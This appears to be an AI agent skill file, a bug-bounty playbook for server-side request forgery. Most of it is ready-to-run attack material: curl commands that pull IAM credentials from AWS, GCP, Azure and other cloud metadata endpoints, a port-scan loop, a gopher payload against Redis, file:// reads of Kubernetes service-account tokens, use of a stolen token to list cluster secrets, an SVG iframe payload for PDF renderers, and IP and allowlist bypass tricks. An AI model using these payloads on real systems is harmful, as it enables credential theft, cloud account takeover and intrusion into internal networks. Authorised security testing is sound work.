name: bug-bounty-ssrf
description: >-
  Server-Side Request Forgery (SSRF) exploitation for bug bounty. Covers cloud
  metadata access (AWS IMDSv1/v2, GCP, Azure, DigitalOcean), internal service
  enumeration, protocol abuse (gopher, dict, file, LDAP), Kubernetes pivoting,
  service mesh metadata (Istio/Envoy, Linkerd, Consul), container runtime socket
  exposure, DNS rebinding with modern tooling, PDF/HTML rendering SSRF, IP 
  representation bypasses (decimal, octal, hex, IPv6), and URL parser confusion
  techniques. Based on disclosed HackerOne patterns including Capital One (SSRF
  to IMDS), GitLab SSRF, and modern Kubernetes attacks.
domain: cybersecurity
subdomain: web-application-security
tags:
  - bug-bounty
  - ssrf
  - cloud-metadata
  - kubernetes
  - internal-service
  - gopher
  - ip-bypass
  - dns-rebinding
  - pdf-ssrf
  - service-mesh
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Bug Bounty SSRF Exploitation

## Trigger Keywords

SSRF, server-side request forgery, cloud metadata, IMDS, internal service, fetch URL, proxy, webhook, URL import, render, PDF generator, screenshot, redirect_uri, DNS rebinding, gopher, 169.254.169.254

## Input

Endpoint accepting user-supplied URLs, webhook configuration, image/DOC import from URL, PDF generator, website preview, or redirect_uri parameter.

## Process

### Step 1: Identify SSRF Vectors

```bash
# Common parameter names (test each with http://YOUR-SERVER.com/ssrf-test)
url= dest= redirect= uri= path= continue= next= data= reference=
site= html= validate= domain= callback= return= page= feed= host=
port= to= out= view= dir= origin= source= endpoint= proxy= fetch=
img_url= link= site_url= media_url=
```

### Step 2: Cloud Metadata Access

```bash
# AWS IMDSv1 (still common in legacy environments)
curl -sk "https://target.com/api?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# AWS IMDSv2 (two-step — if app supports PUT or custom methods)
# Step 1: Get token
curl -sk -X PUT "https://target.com/api?url=http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
# Step 2: Use token
curl -sk "https://target.com/api?url=http://169.254.169.254/latest/meta-data/" \
  -H "X-aws-ec2-metadata-token: TOKEN"

# GCP (requires Metadata-Flavor: Google header)
curl -sk "https://target.com/api?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# Azure (requires Metadata: true header)
curl -sk "https://target.com/api?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  -H "Metadata: true"

# DigitalOcean
curl -sk "https://target.com/api?url=http://169.254.169.254/metadata/v1.json"

# Oracle Cloud
curl -sk "https://target.com/api?url=http://169.254.169.254/opc/v1/instance/"

# Alibaba Cloud
curl -sk "https://target.com/api?url=http://100.100.100.200/latest/meta-data/"

# OpenStack
curl -sk "https://target.com/api?url=http://169.254.169.254/openstack/latest/meta_data.json"
```

### Step 3: Internal Service Enumeration & Protocol Abuse

```bash
# Port scanning via time differences
for port in 22 80 443 3000 3306 5432 6379 8000 8080 8443 8500 9090 10250 15000; do
  start=$(date +%s%N)
  curl -sk -o /dev/null "https://target.com/api?url=http://127.0.0.1:$port"
  elapsed=$(( ($(date +%s%N) - start) / 1000000 ))
  echo "Port $port: ${elapsed}ms"
done

# Redis via gopher (write SSH key)
gopher://127.0.0.1:6379/_SET%20ssrf%20%22hello%22%0D%0ASAVE

# Admin panels (common localhost ports)
http://localhost:3000       # React/Next dev, Grafana
http://localhost:8000       # Django dev
http://localhost:8080       # Jenkins, Tomcat
http://localhost:8500       # Consul
http://localhost:9090       # Prometheus
http://127.0.0.1:10250      # Kubelet
http://127.0.0.1:15000      # Envoy admin
http://127.0.0.1:15001      # Envoy alt admin
http://127.0.0.1:4191       # Linkerd proxy metrics
```

### Step 4: Kubernetes Pivoting

```bash
# Extract service account token via SSRF allowing file:// protocol
http://vulnerable-app?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token

# Kubelet API (read-only port — often unauthenticated)
curl -sk "https://target.com/api?url=http://127.0.0.1:10255/pods"

# Kubelet API (authenticated port — 10250)
curl -sk "https://target.com/api?url=http://127.0.0.1:10250/pods"

# Kubernetes API via service account token
TOKEN=<extracted_token>
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://target.com/api?url=https://kubernetes.default.svc/api/v1/namespaces/default/secrets"

# Service mesh enumeration
http://127.0.0.1:15000/config_dump    # Istio/Envoy — full mesh config
http://127.0.0.1:15000/clusters       # Envoy upstream services
http://127.0.0.1:15000/certs          # TLS certificates
http://127.0.0.1:4191/metrics         # Linkerd proxy metrics
http://127.0.0.1:8500/v1/catalog/services  # Consul service catalog

# Container runtime sockets
# unix:///var/run/docker.sock:/v1.40/containers/json
# unix:///run/containerd/containerd.sock
```

### Step 5: DNS Rebinding

```bash
# Modern DNS rebinding tools:
# rbndr.us: curl http://make-1.2.3.4-127.0.0.1-rbndr.us
# 1u.ms:     curl http://1u.ms/A-127.0.0.1:1-2  
# First resolves to your server (probe), then to internal IP (exploit)
```

### Step 6: PDF/HTML Rendering SSRF

```xml
<!-- SVG in PDF context — attack iframe embedding -->
<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="800" height="500">
  <foreignObject width="800" height="500">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"/>
    </body>
  </foreignObject>
</svg>
```

## IP Bypass Library

```
127.0.0.1 → 2130706433 (decimal)     → http://2130706433/
127.0.0.1 → 0x7f.0.0.1 (hex)         → http://0x7f.0.0.1/
127.0.0.1 → 0177.0.0.1 (octal)       → http://0177.0.0.1/
127.0.0.1 → 127.1 (shortened)        → http://127.1/
127.0.0.1 → [::ffff:127.0.0.1]       → http://[::ffff:127.0.0.1]/
127.0.0.1 → [::1] (IPv6)             → http://[::1]/
localhost → localhost.evil.com        → if you control evil.com DNS
127.0.0.1 → http://127%2e0%2e0%2e1/  → URL encoding
http:// → http:////localhost/         → schema confusion
```

## Bypass Techniques

```bash
# Allowlist bypass via open redirect
https://allowed.com/redirect?url=http://169.254.169.254/

# Credentials-in-URL bypass
http://allowed.com@169.254.169.254/

# DNS rebinding
http://rbndr.us/ → alternates between attacker IP and 127.0.0.1

# Unicode homoglyphs
http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/  → resolves to localhost in lenient parsers

# Double URL encoding
http://169%252e254%252e169%252e254/ → http://169.254.169.254/ after decode

# HTTP redirect chain
Attacker server 302 → http://169.254.169.254/
```

## SSRF + Header Injection

```bash
# Test if app forwards custom headers
curl -sk "https://target.com/api" -d '{"url":"http://YOUR-SERVER.com","headers":{"Metadata-Flavor":"Google"}}'

# X-Forwarded-For for IP bypass
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Forwarded-Host: internal.target
```

## Tools

| Tool | Purpose |
|------|---------|
| **Interactsh** | OOB detection for blind SSRF |
| **Burp Collaborator** | Callback detection |
| **SSRFmap** | Automated SSRF exploitation framework |
| **Gopherus** | Generate gopher payloads for Redis/MySQL/SMTP |
| **rbndr.us / 1u.ms** | DNS rebinding services |
| **Singularity of Origin** | Advanced DNS rebinding toolkit |
| **enumXFF** | Enumerate IPs in X-Forwarded-For headers |

## Output

Successful SSRF produces: cloud IAM credentials, internal service responses, Kubernetes tokens, network topology information, or arbitrary file reads — any of which can escalate to full cloud account takeover or internal network pivoting.
